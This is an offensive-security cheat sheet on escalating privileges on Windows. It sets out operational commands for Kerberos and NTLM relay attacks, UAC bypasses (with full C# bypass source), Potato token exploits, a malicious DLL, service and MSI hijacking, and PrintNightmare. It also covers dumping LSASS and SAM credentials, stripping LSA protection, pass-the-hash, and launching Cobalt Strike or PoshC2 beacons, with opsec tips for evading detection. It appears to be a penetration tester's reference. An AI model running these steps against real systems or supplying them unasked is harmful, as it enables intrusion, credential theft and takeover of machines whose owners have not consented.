# __Elevate privileges on Windows__
>Author: Pieter Miske
---
### __Automated privesc enumeration tools:__
- Check for misconfigurations that allow for local privilege escalation \([SharpUp](https://github.com/GhostPack/SharpUp)\): ```sharpup.exe audit```
- Thoroughly enumerate for local privesc vulnerabilities \(OPSEC: very noisy\) \([PrivescCheck](https://github.com/itm4n/PrivescCheck)\): ```Invoke-PrivescCheck```
- This tool aims to enumerate common Windows configuration issues and secrets in files \(OPSEC: very noisy\) \([WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe)\): ```.\winPEAS.exe (systeminfo) (userinfo) (serviceinfo) (applicationinfo) (windowscreds) (filesinfo)```

### __Abuse LPE domain vulnerabilties:__
>To leverage these "No\-Fix" LPE techniques it is mandatory that the workstation is domain joined. Furthermore, it is required that LDAP signing is not configured on the Domain Controller \(default\)\.
##### _KrbRelay with RBCD/ShadowCredential privilege escalation:_
- ShadowCredential method: it is mandatory that the Domain Controller has its own key pair \(e\.g ADCS is enabled or certificate authority \(CA\) is configured on the DC\)\.
	- 1\. force SYSTEM authentication, relay Krb auth to LDAP and set a newly generated KeyCredential to the local machine account's 'msDS\-KeyCredentialLink' attribute \([krbRelayUp](https://github.com/Dec0ne/KrbRelayUp)\): ```KrbRelayUp.exe relay -m shadowcred –ForceShadowCred```
	- 2\. Via the KeyCredential obtain TGT for the local machine account, use S4U2self method to get TGS for administrator user, import the TGS, and start the Service Manager to bypass UAC via SCMUACBypass method \(the payload\.exe will die so make sure it starts a new process\) \(KrbRleayUp\): ```KrbRelayUp.exe spawn -m shadowcred -d <FQDN> -dc <FQDN DC> -ce <base64 TGS string> (-s <new service name>) -sc C:\<path to payload.exe>```
- RBCD method: it is mandatory the compromised user has control over or is able to add a new computer account to the domain \(default\)\.
	- 1\. Create a new computer account, force SYSTEM authentication, relay Krb auth to LDAP and set RBCD on the current computer account \([krbRelayUp](https://github.com/Dec0ne/KrbRelayUp)\): ```KrbRelayUp.exe relay -Domain <FQDN> -CreateNewComputerAccount -ComputerName <new computer name>$ -ComputerPassword <new password>```
	- 2\. Request TGT, use S4U2self method to get TGS for administrator user, import the TGS, and start the Service Manager to bypass UAC via SCMUACBypass method \(KrbRelayUp\): ```KrbRelayUp.exe spawn -m rbcd -d <domain> -dc <FQDN DC> -cn <created computer name>$ -cp <password> (-s <new service name>) -sc C:\<path to payload.exe>```

##### _Privilege escalation on workstation via WebClient:_
- 1\. Verify if the WebClient service is listed as 'Stopped' or 'Running': ```Get-Service WebClient```
- 2\. If the WebClient is stopped, you may be able to start the service programmatically via a service trigger:
    - \([StartWebClient BOF](https://github.com/outflanknl/C2-Tool-Collection/tree/main/BOF/StartWebClient)\): ```StartWebClient```
    - \([StartWebClient](https://gist.github.com/klezVirus/af004842a73779e1d03d47e041115797)\): ```.\StartWC.exe```
- 3\. Start relay server that will convert http traffic to ldaps, create a new computer account and give it RBCD privileges \(impacket\): ```(proxychains4) python3 ntlmrelayx.py -smb2support -t ldaps://<FQDN DC> --delegate-access```
- 4\. Start Responder to establish host name resolution to your own attacker system \(turn smb and http off in Responder\.conf\): ```python Responder.py -I <interface> -v```
- 5\. \(optional\) if Responder is not running in the same domain as the target system, add a new DNS record that points to your attacker system or a pivot host \([Powermad](https://github.com/Kevin-Robertson/Powermad)\): ```Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData <IP own system or pivot host>```
- 6\. Coerce the current system to make a webdav \(http\) based authentication request to your relay server \(example PetitPotam): ```Invoke\-PetitPotam <FQDN current system> '<Responder Machine Name or set DNS name>@80/test'```
- 7\. Request TGT of DA via the RBCD privilege \(impacket\): ```python3 getST.py -spn host/<FQDN target system> -dc-ip <IP DC> -impersonate Administrator <FQDN>/<name new computer account>\$```
- 8\. Import the ticket into your session\.


### __Abuse user & group privileges:__
##### _Administrator Privilege: Bypass User Account Control \(UAC\):_
UAC Bypass is used to bypass the message box that asks for approval when a program wants to run with elevated privileges\. If you are in a shell context, you can not give approval by clicking yes in the message box\. UAC bypass only works for users that are already in the Administrator group.
>Most methods will still work but may trigger AV and kill the current beacon \(this will most of the time not stop a new high intergrity beacon from starting\)\. 
- Multiple UAC bypass techniques:
	- 1\. Base64 encode the command you want to execute with elevated privs (e.g. cmd /c "C:\\users\\public\\documents\\payload\.exe")
	- 2\. Select one of the following UAC bypass techniques:
		- fodhelper
		- computerdefaults
		- sdclt
		- slui
		- dikcleanup \(command generated in step needs to end on "&& REM"\)
	- 3\. Bypass UAC \([SharpBypassUAC](https://github.com/FatRodzianko/SharpBypassUAC)\): ```.\SharpBypassUAC.exe -b <UAC bypass technique> -e <base64 encoded command>```
- UAC bypass based on SendKeys (more [info](https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html)\) (OPSEC: if a user is actively using the workstation, using this UAC bypass may attracked unwanted attention duo a short pop\-up of both the CMSTP application and terminal window\)\. 
    - 1\. Save the following C\# code as "custom\-uac\-bypass\.cs":
        ```Csharp
        using System;
        using System.Text;
        using System.IO;
        using System.Diagnostics;
        using System.ComponentModel;
        using System.Windows;
        using System.Runtime.InteropServices;
        
        public class CMSTPBypass
        {
            // the.INF file data!
            public static string InfData = @"[version]
        Signature=$chicago$
        AdvancedINF=2.5
        
        [DefaultInstall]
        CustomDestination=CustInstDestSectionAllUsers
        RunPreSetupCommands=RunPreSetupCommandsSection
        
        [RunPreSetupCommandsSection]
        ; Commands Here will be run Before Setup Begins to install
        REPLACE_COMMAND_LINE
        taskkill /IM cmstp.exe /F
        
        [CustInstDestSectionAllUsers]
        49000,49001=AllUSer_LDIDSection, 7
        
        [AllUSer_LDIDSection]
        ""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
        
        [Strings]
        ServiceName=""Windows 10 VPN client""
        ShortSvcName=""Windows 10 VPN client""
        ";
        
            [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
            [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
        
            public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
        
            /* Generates a random named .inf file with command to be executed with UAC privileges */
            public static string SetInfFile(string CommandToExecute)
            {
                string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
                string TemporaryDir = "C:\\windows\\temp";
                StringBuilder OutputFile = new StringBuilder();
                OutputFile.Append(TemporaryDir);
                OutputFile.Append("\\");
                OutputFile.Append(RandomFileName);
                OutputFile.Append(".inf");
                StringBuilder newInfData = new StringBuilder(InfData);
                newInfData.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
                File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
                return OutputFile.ToString();
            }
        
            public static bool Execute(string CommandToExecute)
            {
                if(!File.Exists(BinaryPath))
                {
                    Console.WriteLine("cmstp.exe not found!");
                    return false;
                }
                StringBuilder InfFile = new StringBuilder();
                InfFile.Append(SetInfFile(CommandToExecute));
        
                Console.WriteLine("File written to " + InfFile.ToString());
                ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
                startInfo.Arguments = "/au " + InfFile.ToString();
                startInfo.UseShellExecute = false;
                Process.Start(startInfo);
        
                IntPtr windowHandle = new IntPtr();
                windowHandle = IntPtr.Zero;
                do {
                    windowHandle = SetWindowActive("cmstp");
                } while (windowHandle == IntPtr.Zero);
        
                System.Windows.Forms.SendKeys.SendWait("{ENTER}");
                return true;
            }
        
            public static IntPtr SetWindowActive(string ProcessName)
            {
                Process[] target = Process.GetProcessesByName(ProcessName);
                if(target.Length == 0) return IntPtr.Zero;
                target[0].Refresh();
                IntPtr WindowHandle = new IntPtr();
                WindowHandle = target[0].MainWindowHandle;
                if(WindowHandle == IntPtr.Zero) return IntPtr.Zero;
                SetForegroundWindow(WindowHandle);
                ShowWindow(WindowHandle, 5);
                return WindowHandle;
            }
        }
        ```
	- 2\. Compile “custom\-uac\-bypass\.cs” to a DLL:  ```Add-Type -TypeDefinition ([IO.File]::ReadAllText("C:\<path to>\custom-uac-bypass.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "UAC-Bypass.dll"```
	- 3\. Convert the UAC\-Bypass\.dll to a base64 string: ```[convert]::ToBase64String([IO.File]::ReadAllBytes("C:\<path to>\UAC-Bypass.dll"))```
	- 4\. Copy and paste the base64 string in the place holder of the following script and save as "custom-uac-bypass.ps1":
        ```PowerShell
        function UAC
        {
            Param(
                [Parameter(Mandatory = $true, Position = 0)]
                [string]$Command
            )
            if(-not ([System.Management.Automation.PSTypeName]'CMSTPBypass').Type)
            {
                [Reflection.Assembly]::Load([Convert]::FromBase64String("<BASE64 STRING PLACEHOLDER>")) | Out-Null
            }
            [CMSTPBypass]::Execute($Command)
        } 
        ```
	- 5\. Bypass UAC and execute a command with elevated privileges \(it is recommended to execute this command repidly 2x times in a row\): ```UAC -Command 'C:\Windows\System32\cmd.exe /C "<command to execute>"'```
	- 6\. \(optional\) Delete the \.inf file that is stored in the “C:\\Windows\\Temp” directory \(note the file name based on the script output\)\.

##### _SeImpersonatePrivilege: Potato exploits:_
- Via MS\-EFSR protocol \(a.k.a. PetitPotam\) \([EfsPotato](https://github.com/zcgonvh/EfsPotato)\): ```.\EfsPotato.exe <command>```
- Via Spool Service \([PrintSpoofer](https://github.com/itm4n/PrintSpoofer)\): ```.\PrintSpoofer.exe -c c:\users\public\documents\payload.exe```
- Instruct the DCOM server to perform a remote OXID query to a system under your control and redirects the OXID resolutions requests to a “fake” OXID RPC Server (this technique works on Windows 10 versions higher than 1803 and Server 2019)\.
	- 1\. On a \(linux\) system under your control start a redirector that accepts incoming request and forwards them to the listening port of the RoguePotato binary \(the fake OXID resolver\) running on the target system: ```socat -d -d tcp4-listen:135,reuseaddr,fork tcp4-connect:<TARGET IP>:8080```
	- 2\. Upload both the "RoguePotato\.exe" and RogueOxidResolver\.exe binary to the target system and start the fake OXID resolver that to get a SYSTEM beacon \([RoguePotato](https://github.com/antonioCoco/RoguePotato)\): ```.\RoguePotato.exe -r <own ip> -e "<command to execute or binary to run>" -l 8080 (-p testpipe)```
- This method tricks the “NT AUTHORITY\\SYSTEM” account into authenticating via NTLM to a controlled TCP endpoint and negotiates a security token that is finally been impersonated (this technique works on Windows 10 1803, Server 2016 and lower\). If the default BITS class identifier \(CLSID\) doesn't work on the targets OS type, check [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID) for another one\) \([JuicyPotato](https://github.com/ohpe/juicy-potato)\): ```JuicyPotato.exe -t * -p <path to payload.exe> -l <random port (e..g 9001)> (-c {<CLSID (e.g. 9B1F122C-2982-4e91-AA8B-E071D54F2A4D)>})```

##### _SeRestorePrivilege abuse:_ 
- Run any command as NT\\SYSTEM \([SeRestoreAbuse](https://github.com/xct/SeRestoreAbuse.git)\): ```.\SeRestoreAbuse.exe "cmd /c <command>"```

##### _SeManageVolumePrivilege abuse:_ 
This technique gives full control over the C: directory structure\. An attacker can read and write files anywhere on the system\. 
- 1\. Run tool \([SeManageVolumeAbuse](https://github.com/xct/SeManageVolumeAbuse.git)\): ```.\SeManageVolumeAbuse.exe```
- 2\. It is now possible to read and write files in a privileged context and start for example a beacon:
	- 1\. Create a custom dll and save it as tzres\.c:
        ```C
        #include <windows.h>
        BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
            if (dwReason == DLL_PROCESS_ATTACH){
                system("powershell.exe -ep bypass -c \"<command here>\"");
                ExitProcess(0);
            }
            return TRUE;
        }
        ```
	- 2\. Compile the dll: ```x86_64-w64-mingw32-gcc tzres.c -shared -o tzres.dll```
	- 3\. Upload the dll to the target system and save it as "C:\\Windows\\System32\\wbem\\tzres\.dll"
	- 4\. To start a beacon as NT\\NETWORK SERVICE, call "systeminfo" to trigger it: ```systeminfo```
	- 5\. Elevate from NT\\NETWORK to NT\\SYSTEM via any SeImpersonatePrivilege exploit \(Potatoes\)\. 
	- 6\. To correctly stop the NT\\NETWORK shell/beacon, kill the process and do NOT exit the shell \(otherwise the systeminfo process will hang and can’t be exploited again without system reboot\): ```taskkill /f /pid <PID PS process>```

##### _SeBackupPrivilege abuse:_
- If you can’t access all folders or documents on a system \(e\.g\. file server\) but have the SeBackUpPrivilege, you can copy any folder/share to a new accessible location: ```robocopy /b C:\<path to source folder> C:\<path to destination>```

##### _PowerShell Remoting Privilege:_
- If the owned user account is member of the ‘Powershell Remoting’ group, it is possible to execute code directly on another system: ```invoke-command -computername <target computer name (e.g. dc01)> -scriptblock {<code to execute (e.g. hostname, iex)>}```

##### _SeLoadDriverPrivilege Privilege:_
This technique requires the "SeLoadDriverPrivilege" privilege and makes it possible to load a malicious device driver and execute code in the kernel space\. 
- 1\. Upload the following [files](https://github.com/mach1el/htb-scripts/tree/master/exploit-fuse) to the target “C:\\temp” directory: Capsom\.sys, EOPLOADDRIVER\.exe, ExploitCapsom\_modded\.exe and netcat\.bat\. 
- 2\. Modify the netcat\.bat file so it starts a beacon
- 3\. On the target host run driver exploit \(successful when showing "NTSTATUS: 0000000, WinError: 0"\): ```.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\Capcom.sys```
- 4\. Execute the netcat\.bat file: ```.\ExploitCapcom_modded.exe``` 


### __Abuse vulnerable software & service permissions:__
##### _Weak service \(binary\) permissions exploitation:_
Weak service \(binary\) permissions can result in modifying service configurations by changing the “binPath” variable or directly overwriting the service binary\. If the targeted binary is running with high privileges and can be restarten or auto starts after termination, it is possible to leverage this type of vulnerabilities to obtain system level access\.
>If using Cobalt Strike, all the ‘sc’ command can be run as BOF \([CS\-Situational\-Awareness\-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF) | [CS\-Remote\-OPs\-BOF](https://github.com/trustedsec/CS-Remote-OPs-BOF)\)
- 1\. Enumerate for vulnerable service permissions \(use the already discribed ‘SharpUp’ tool for this\)\.
- 2\. Check if the service runs as system and uses "auto\_start" as start type: ```sc qc <service name>```
- 3\. Verify if for: 
	- weak service permission, you have the correct permissions \([Get\-ServiceAcl](https://gist.github.com/cube0x0/1cdef7a90473443f72f28df085241175)\): ```Get-ServiceAcl -Name <name vuln service> | select -expandpropery Access``` 
	- weak service binary permission, it is possible to replace the binary: ```Get-Acl -Path "C:\<path to vuln binary>"" | fl```
- 4\. Create a "Windows Service EXE binary" from the “Payload Development” section \(is it mandatory to execute a payload that is able to run a command in a new process because the orginial service process will crash after execution\)\. 
- 5\. Upload everything that is needed for the exploitation \-like the created binary\- to the target system\. 
- 6\. Take the staps needed so the binary will be executed:
	- Weak service binary permission: Replace the original binary \(move and give it a new name\) with the custum binary \(this most likely requires you to first stop the binary\)\. 
	- Weak service permission: 
		- 1\. modify the service config so it points to your payload \(note the original 'BINARY\_PATH\_NAME' so it can later be restored\): ```sc config "<name vulnerable service>" binPath= "C:\<path to payload.exe>"```
		- 2\. If not already, change “SERVICE\_START\_NAME” attribute to localsystem: ```sc config "<name vulnerable service>" obj= "LocalSystem"```
		- 3\. If not already, change “START\_TYPE” attribute to AUTO\_START: ```sc config "<name vulnerable service>" start=auto```
- 7\. Restart the vulnereable service:
	- If the user has anough privileges:
		- 1: ```sc stop <vuln-service>```
		- 2: ```sc start <vuln-service>```
	- Restart system if the vulnerable service has auto restart and the user has the “SeShutdownPrivilege”: ```shutdown /r```

##### _Unquoted service path exploitation:_
Unquoted service path exploits the way the system is searching and running a specific binary\. If the targeted binary is running with high privileges and can be restarten or auto starts after termination, it is possible to leverage this  vulnerabilities to obtain system level access\. 
- 1\. Enumerate for unquoted service paths:
	- List all services and check manually: ```wmic service get name, pathname```
	- Filter on missing quotes: ```wmic service get name, pathname, displayname, startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """```
- 2\. Check if the service runs as system and uses "auto\_start" as start type: ```sc qc <service name>```
- 3\. Verify if for unquoted service path, it is possible to write to one of the directories containing spaces \(the '\(\)' are mandatory\): ```(Get-Acl C:\<path to dir>).access```
- 4\. Create a “Windows Service EXE binary” from the “Payload Development” section \(is it mandatory to execute a payload that is able to run a command in a new process because the orginial service process will crash after execution\)\. 
- 5\. Upload everything that is needed for the exploitation \-like the created binary\- to the target system
- 6\. Move your custom binary to the vulnerable folder and rename it \(e\.g\. move the payload "Privacy\.exe" to "C:\\Program Files \(x86\)\\Cybertron\\Privacy Drive" which is the vulnerable path for the service: "C:\\Program Files \(x86\)\\Cybertron\\Privacy Drive\\pdsvc\.exe"\) \(if the payload doesn’t run, rename it without the \.exe extention\)\. 
- 7\. Restart the vulnereable service:
	- If the user has anough privileges:
		- 1: ```sc stop <vuln-service>```
		- 2: ```sc start <vuln-service>```
	- Restart system if the vulnerable service has auto restart and the user has the “SeShutdownPrivilege”: ```shutdown /r```
- 8\. \(optional\) restore changes by deleting the custom binary from the vulnerable folder\. 

##### _AlwaysInstallElavated registry key abuse:_
The AlwaysInstallElevated is an ‘feature’ that allows the installation of software packages in privileged context by all authenticated users:
- 1\. Check set registry key \(or run SharpUp for automated check\):
    ```
    reg query HKEY_LOCAL_MACHINE\software\Policies\Microsoft\Windows\Installer
	reg query HKEY_LOCAL_MACHINE\software\Policies\Microsoft\Windows\Installer
	```
- 2\. Create \.msi installer that serves as a wrapper for an arbitrary payload executable \(e\.g\. beacon\): 
	- 1\. Create a payload \(e\.g\. beacon\.exe or HInjector\.exe\) as the payload
	- 2\. In visual studio download and install the “Installer Project” package \(go to: Extensitions > Manage Extenstions and search for: Microsoft Visual Studio Installer Project\)\. 
	- 3\. Re\-open Visual Studio, select Create a new project and search "installer"\. Select the “Setup Wizard” project, give it a name \(MSIinstaller\) and click “Create”\.
	- 4\. Keep clicking Next until you get to step 3 of 4 \(choose files to include\)\. Click Add and select the payload you just generated\. Then click Finish\.
	- 5\. Highlight the MSIinstaller project in the Solution Explorer \(right panel\) and in the Properties, change TargetPlatform from x86 to x64 \(recommended to change other parameters aswell for opsec like the “Manufacturer” attribute\)\. 
	- 6\. Now right\-click the project and select View > Custom Actions\. Right\-click Install and select Add Custom Action\. Double\-click on Application Folder, select your payload\.exe file and click OK\. In the properties section change “Run64Bit” to True\. 
	- 7\. Build project\. 
- 3\. Upload payload to target system and \(if required\) start listener on own machine
- 4\. Execute payload on target system: ```msiexec /q /n /i MSIinstaller.msi```
- 5\. Uninstall and remove the MSI: ```msiexec /q /n /uninstall MSIinstaller.msi```

##### _PrintNightmare \(CVE\-2021\-1675 | CVE\-2021\-34527\):_
This vulnerability exists due to an authorisation bypass bug in the Print Spooler service spoolsv\.exe on Windows systems, which allows authenticated remote users to install print drivers using the RPC call RpcAddPrinterDriver and specify a driver file located on a remote location\. A malicious user exploiting this could obtain SYSTEM level privileges on a Windows system running this service by injecting a malicious DLL as part of installing a print driver\.
>Recommended to use the dll as a dropper that downloads and executes the actual payload in memory\. 
- 1\. Create a custom DLL dropper and upload that DLL to the target system or host it on a share that is accessible from the target system \(check the “Payload development” section\)\.
- 2\. Run the exploit and execute the code inside the dll \([SharpKatz](https://github.com/b4rtik/SharpKatz)\): ```SharpKatz.exe --Command printnightmare --Target <current system name> --Library  C:\\users\\public\\documents\\payload.dll```


---
### __Dump local secrets:__
##### _Extract hashes from LSASS:_
- Extract secrets via LSASS process dump:
	- 1\. Dump LSASS:
		- \([CS\-Remote\-OPs\-BOF](https://github.com/trustedsec/CS-Remote-OPs-BOF)\): `procdump <PID LSASS> C:\<location to store dump file>\dump.bin`
		- \([Safetykatz](https://github.com/GhostPack/SafetyKatz)\): `safetykatz minidump`
	- 2\. Download the ‘dump\.bin’ or ‘min\_debug\.bin’ file to your own machine
	- 3\. Extract hashes on own Linux system \([Pypykatz](https://github.com/skelsec/pypykatz)\): `pypykatz lsa minidump dump.bin -e`
- List Kerberos encryption keys \([SharpKatz](https://github.com/b4rtik/SharpKatz)\): `SharpKatz.exe --Command ekeys`
- Dump user secrets from all providers \(kerberos, credman, ekeys, etc\) \(SharpKatz\): `SharpKatz.exe --Command logonpasswords`

##### _Bypass LSA protection to dump LSASS:_
When LSA protection is enabled, the LSASS process is marked as Protected Process Light \(PPL\), meaning that you can't inject code or tamper with the process\. 
- 1\. Check if LSA protection is enabled \(can also be done via seatbelt\): `Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"`
- 2\. Upload the 'mimidrv.sys' driver \-that accompanies Mimikatz\- to the target system \(may require that you first disable AV real time protection to prefent AV flagging 'mimidrv\.sys'\)
- 3\. In the same directory as the saved 'mimidrv\.sys' driver, run Invoke\-Mimikatz to load it:
	- 1: `Invoke-Mimikatz -Command "!+"`
	- 2: ```Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""```
- 4\. It is now possible to dump LSASS \(recommended to use SharpKatz\)
- 5\. Unload the driver after you finish:
	- 1: ```Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe`""```
	- 2: `Invoke-Mimikatz -Command "!-"`

##### _Extract hashes from SAM:_
>The system doesn't allow you to copy the SAM \(C:\\Windows\\System32\\config\\SAM\), SYSTEM \(C:\\Windows\\System32\\config\\SYSTEM\) and SECURITY \(C:\\Windows\\System32\\config\\SECURITY\) files, but let you copy its content from the registry mount location\. Furthermore, also check for stored backup files in C:\\Windows\\System32\\config\\RegBack\\<file>\.
- Manual via CMD:
	- 1\. Make a copy of the following files:
		- 1: `reg save HKLM\SYSTEM system.save`
		- 2: `reg save HKLM\SAM sam\save`
		- 3: `reg save HKLM\SECURITY security.save`
	- 2\. Download files to own machine and delete all made copies on the target system
	- 3\. Dump hashes from extarcted files \([impacket](https://github.com/SecureAuthCorp/impacket)\): `secretsdump.py -sam sam.save -system system.save -security security.save (-history) LOCAL`
- Via Mimikatz \([Mimikatz\.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)\): `Invoke-Mimikatz -Command "lsadump::sam"`


---
### __Start high integrity beacon on a system:__
##### _Cobalt Strike localhost beacon:_
This method can be used to locally start a high integrity beacon without connecting it directly to the TS\. *
- 1\. Start a new "Beacon TCP" listener and select the "localhost" box
- 2\. Create a beacon\.exe payload for the started TCP listener
- 3\. Execute the payload via whatever available privesc method\.
- 4\. Connect to the high integrity beacon from the already established mid integrity beacon \(Beacon TCP\): `connect localhost <port>`

##### _PoshC2 localhost Daisy Server:_
This method can be used to minimize egress by locally running the daisy server and execute the daisy payload via an arbitrary privesc vulnerability that allows for command/code execution\.
- 1\. Start daisy server in an already established low/medium integrity beacon and follow the wizard for configuration \(during configuration specify that you are NOT elevated and choose a high port that doesn't require elevated privileges\): `startdaisy`
- 2\. Do all the preparation and exploitation steps that are needed to successfully privesc and use the generated daisy payload\. 

##### _Local Pass-the-Hash to start beacon:_
This method can be used to start a high integrity process in the context of NT\\SYSTEM \(PSexec\) or local administrator \(WMIexec\) using pass\-the\-hash\. 
- From beacon:
	- Sharp PSexec: run command or verify local admin access \(if no command is specified, it checks local admin access\. Also the tool is slow so give it time\) \(for PoshC2: SharpInvoke\_SMBExec\.Program\) \([Sharp\-SMBExec](https://github.com/checkymander/Sharp-SMBExec)\) `Sharp-SMBExec.exe hash:"<hash>" username:"<username>" (domain:"<domain>") target:"127.0.0." (command:"<command>")`
	- PowerShell WMI: run elevated command \([Invoke\-WMIExec\.ps1](https://github.com/Kevin-Robertson/Invoke-TheHash)\): `Invoke-WMIExec -Target 127.0.0.1 (-Domain <domain name>) -Username <username> -Hash <NT hash> -Command "<command>" (-verbose)`
- From attacker system:
	- Start interactive shell on target system \([Impacket](https://github.com/SecureAuthCorp/impacket)\): `python3 <psexec.py | wmiexec.py> (<FQDN>/)<username>(:<password>)@<target ip> (-hashes <NTLM>)`
	- Execute command without starting sesison \([impacket](https://github.com/SecureAuthCorp/impacket)\): `python3 wmiexec.py -nooutput (-hashes :<NTLM>) ".\/Administrator"@<target ip> (<command to run>)`

##### _RunAs:_
This technique can be useful to run commands on the local system as another user\.
>The user must be the local Administrator account or a domain user with high privileges on the local system to make this work.\. 
- Cobalt Strike: `runas (<domain>\)<user> <password> <command> (<arguments>)`
- PoshC2: `runasps <domain or local netbios> <username> "<password>" "<command>"`

##### _From Restricted Administrator session to NT\\AUTHORITY SYSTEM:_
This technique can help to bypass a hardened environment where the local administrator is configured without the 'SeDebugPrivilege' privilege which makes migrating to a SYSTEM process otherwise impossible\.
- 1\. Upload the PsExec tool from Sysinternal and a payload\.exe to the system\. 
- 2\. Run commands as SYSTEM \(the \-s parameter will run any command as SYSTEM\): `.\PsExec64.exe -accepteula -s cmd /c "C:\users\public\documents\payload.exe"`

